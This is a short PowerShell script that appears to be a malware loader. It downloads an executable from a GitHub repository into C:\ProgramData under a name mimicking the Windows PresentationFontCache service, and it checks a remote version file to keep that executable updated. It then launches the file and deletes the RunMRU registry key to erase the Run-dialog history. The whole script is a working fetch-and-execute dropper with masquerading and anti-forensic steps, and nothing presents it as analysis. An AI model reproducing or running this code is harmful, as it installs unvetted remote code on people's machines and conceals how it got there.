Start-Sleep -s 30
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
$file_text = "C:\ProgramData\version.txt"

# Check if the version has changed
if ((Test-Path $file_text) -and (Get-Content $file_text) -eq (Invoke-WebRequest $url_text).Content) {
    # Version has not changed, just run the existing exe file
    $file = "C:\ProgramData\PresentationFontCache.exe"
} else {
    # Version has changed, download the new exe file
    $down = New-Object System.Net.WebClient
    $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
    $file = "C:\ProgramData\PresentationFontCache.exe"
    $down.DownloadFile($url,$file)

    # Update the version file
    $down.DownloadFile($url_text,$file_text)
    Set-Content $file_text (Invoke-WebRequest $url_text).Content
}

# Run the exe file
$exec = New-Object -com shell.application
$exec.shellexecute($file)

# Delete registry entry
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Exit the script
exit
